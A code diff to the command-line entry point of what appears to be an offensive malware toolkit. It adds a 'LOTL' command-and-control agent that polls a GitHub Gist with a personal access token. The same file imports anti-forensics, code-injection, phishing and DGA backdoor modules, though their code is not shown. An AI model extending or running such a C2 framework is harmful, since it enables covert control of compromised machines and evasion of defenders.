@@ -22,6 +22,7 @@ from modules.anti_forensics import scorched_earth
 from modules.evasion import inject_code, hide_in_filesystem, find_process_by_name
 from modules.social_engineering import clone_website, create_macro_doc, send_email
 from modules.backdoor import dga_agent
+from modules.lotl_c2 import lotl_agent
 
 def load_config(config_path='config.json'):
     """Load configuration from a JSON file."""
@@ -151,6 +152,12 @@ def main():
     dga_parser = subparsers.add_parser("dga-agent", help="Start the DGA C2 agent")
     dga_parser.add_argument("--seed", required=True, help="The DGA seed to use")
     dga_parser.add_argument("--interval", type=int, default=3600, help="Polling interval in seconds")
+
+    # LOTL Agent
+    lotl_parser = subparsers.add_parser("lotl-agent", help="Start the LOTL C2 agent")
+    lotl_parser.add_argument("--gist-id", required=True, help="The Gist ID to use for C2")
+    lotl_parser.add_argument("--token", required=True, help="Your GitHub personal access token")
+    lotl_parser.add_argument("--interval", type=int, default=60, help="Polling interval in seconds")
 
     args = parser.parse_args()
 
@@ -309,6 +316,9 @@ if target_pid:
 
         elif args.command == "dga-agent":
             dga_agent(args.seed, args.interval)
+
+        elif args.command == "lotl-agent":
+            lotl_agent(args.gist_id, args.token, args.interval)
 
     except Exception as e:
         logging.error(f"An error occurred: {e}", exc_info=args.verbose)
